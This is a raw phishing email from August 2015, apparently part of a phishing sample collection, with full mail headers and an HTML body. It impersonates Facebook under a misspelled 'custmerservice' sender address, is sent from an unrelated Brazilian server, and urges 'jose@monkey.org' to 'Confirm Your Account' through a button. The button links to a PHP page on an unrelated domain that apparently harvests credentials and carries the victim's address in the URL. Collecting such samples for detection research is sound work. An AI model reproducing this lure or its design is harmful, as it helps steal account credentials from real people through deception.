@@ -1,0 +1,127 @@
+Return-Path: <acspmbmg@sim.simeon.com.br>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 0884DF41A4
+	for <jose@login.monkey.org>; Sun, 23 Aug 2015 11:09:00 -0500 (CDT)
+Received: from smtpin16.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay02.b.hostedemail.com (Postfix) with SMTP id C4A8F27AB51
+	for <jose@login.monkey.org>; Sun, 23 Aug 2015 16:08:59 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70552499598.16.space35_1442fd34d081b
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 10,1,0,b1872fee08e61384,d41d8cd98f00b204,acspmbmg@sim.simeon.com.br,:,RULES_HIT:41:72:355:375:379:429:455:495:540:541:543:800:962:967:969:973:983:988:989:1189:1208:1224:1260:1263:1313:1314:1324:1345:1381:1431:1432:1433:1434:1436:1437:1516:1517:1534:1542:1547:1550:1559:1565:1571:1588:1589:1592:1593:1594:1685:1711:1714:1730:1747:1777:1792:1803:2194:2198:2199:2200:2393:2525:2527:2528:2543:2549:2560:2564:2682:2685:2828:2859:2890:2909:2921:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3867:3868:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:5007:6261:6658:6674:6678:7903:8516:8599:8603:8987:9025:9388:9908:10004:10049:11257:11480:11656:11657:11658:11914:12043:12160:12555:12698:12737:12783:12956:12958:12961:13025:13374:13846:14096:21080,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: space35_1442fd34d081b
+X-Filterd-Recvd-Size: 4035
+Received: from sim.simeon.com.br (sim.simeon.com.br [162.144.52.185])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 23 Aug 2015 16:08:59 +0000 (UTC)
+Received: from acspmbmg by sim.simeon.com.br with local (Exim 4.85)
+	(envelope-from <acspmbmg@sim.simeon.com.br>)
+	id 1ZTXpJ-0001b1-DQ
+	for jose@monkey.org; Sun, 23 Aug 2015 13:08:57 -0300
+To: jose@monkey.org
+Subject: 1 Important Massage
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Facebook <custmerservice.facebook@sim.simeon.com.br>
+Reply-To: custmerservice.facebook@sim.simeon.com.br
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: www.acspmbmgo.com.br
+Message-Id: <E1ZTXpJ-0001b1-DQ@sim.simeon.com.br>
+Date: Sun, 23 Aug 2015 13:08:57 -0300
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - sim.simeon.com.br
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [501 32007] / [47 12]
+X-AntiAbuse: Sender Address Domain - sim.simeon.com.br
+X-Get-Message-Sender-Via: sim.simeon.com.br: authenticated_id: acspmbmg/primary_hostname/system user
+X-Source: /usr/bin/php
+X-Source-Args: /usr/bin/php /home/acspmbmg/public_html/index.php 
+X-Source-Dir: acspmbmgo.com.br:/public_html/img/oficiosimg
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 157
+
+<html>
+
+<head>
+<title>E-mail Spam and Fraudulent Survey</title>
+<style type="text/css">
+<!--
+.style2 {font-family: "Courier New", Courier, monospace}
+.style4 {color: #330066; font-weight: bold; font-size: 20px;
+font-family: "Courier New", Courier, monospace; }
+.style8 {font-size: 13px}
+.style9 {
+    color: #2672ec;
+    font-weight: bold;
+}
+body {
+    background-color: #E8E8E8;
+    border-bottom-color: #E8E8E8;
+    border-color: #E8E8E8;
+    border-left-color: #E8E8E8;
+    border-right-color: #E8E8E8;
+    border-top-color: #E8E8E8;
+    color: #CCCCCC;
+    outline-color: #E8E8E8;
+}
+body, td, th {
+    font-family: Courier New, Courier, monospace;
+}
+.style10 {color: #E8E8E8}
+-->
+</style>
+<meta http-equiv="Content-Type" content="text/html">
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<HTML>
+<body><TABLE style="BORDER-BOTTOM: thin solid; BORDER-LEFT: thin
+solid; BORDER-TOP: thin solid; BORDER-RIGHT: thin solid" cellSpacing=0
+borderColor=#e1e1e1 width="100%" bgColor=#e8e8e8 align=center
+height=539>
+<TBODY>
+<TR>
+<TD bgColor=#e8e8e8>
+<TABLE style="BORDER-BOTTOM: thin solid; BORDER-LEFT: thin solid;
+BORDER-TOP: thin solid; BORDER-RIGHT: thin solid" cellSpacing=10
+width=434 bgColor=#ffffff align=center height=277>
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px;
+FONT-FAMILY: ; PADDING-TOP: 0px" class=style10 height=26 width=410>
+<img src="http://media.bestofmicro.com/R/O/464964/original/Facebook-logo-PSD.jpg" width="394" height="113"></TD></TR>
+<TR vAlign=top align=left>
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px;
+FONT-FAMILY: 'Segoe UI'; COLOR: #2a2a2a; FONT-SIZE: 12px; PADDING-TOP:
+14px" height=112>
+<P class=style2><b><font size="3"> Dear jose@monkey.org
+, <BR><BR>
+
+ We just need you to do one more thing:</font></b></P></TD></TR>
+<TR align=left bgColor=#2672ec>
+<TD style="MIN-WIDTH: 10px; PADDING-BOTTOM: 5px; BACKGROUND-COLOR:
+#2672ec; PADDING-LEFT: 20px; PADDING-RIGHT: 20px; PADDING-TOP: 2px"
+bgColor=#2672ec height=22>
+<p align="center">
+<A style="TEXT-ALIGN: center; FONT-FAMILY:
+'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue
+Medium', Arial, sans-serif; LETTER-SPACING: 0.02em; COLOR: #FFFFFF;
+FONT-WEIGHT: 700; TEXT-DECORATION: none"
+href="http://ifrcweb.com/admin/Public/bookmark/ii.php?email=jose@monkey.org
+&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1">
+Confirm Your Account.</A></TD></TR>
+</TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML></body>
+
+</html>
